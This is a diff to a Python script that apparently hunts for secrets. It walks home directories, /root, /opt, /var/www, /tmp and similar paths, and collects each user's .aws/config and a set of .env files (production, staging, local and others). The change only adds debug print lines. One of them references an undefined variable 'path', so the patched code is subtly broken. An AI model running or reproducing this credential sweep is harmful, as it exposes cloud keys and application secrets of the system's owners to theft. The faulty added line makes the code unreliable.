@@ -24,8 +24,11 @@ def run(cmd):
 
 def walk(roots,max_depth,match_fn):
     for root in roots:
-        if not os.path.isdir(root):continue
+        if not os.path.isdir(root):
+            print(str(root) + " not a dir")
+            continue
         for dirpath,dirs,files in os.walk(root,followlinks=False):
+            print("walking" + str(root))
             rel=os.path.relpath(dirpath,root)
             depth=0 if rel=='.' else rel.count(os.sep)+1
             if depth>=max_depth:dirs[:]=[];continue
@@ -37,6 +40,7 @@ homes=[]
 try:
     for e in os.scandir('/home'):
         if e.is_dir():homes.append(e.path)
+        print(homes)
 except OSError as e:print(e)
 homes.append('/root')
 all_roots=homes+['/opt','/srv','/var/www','/app','/data','/var/lib','/tmp']
@@ -59,6 +63,8 @@ for h in homes+['/root']:
     emit(h+'/.aws/config')
 
 for d in ['.','..','../..']:
+    print("checking " + d + " for .env")
+    print("is dir? " + str(os.path.isdir(path)))
     for f in ['.env','.env.local','.env.production','.env.development','.env.staging','.env.test']:
         emit(d+'/'+f)
 emit('/app/.env')
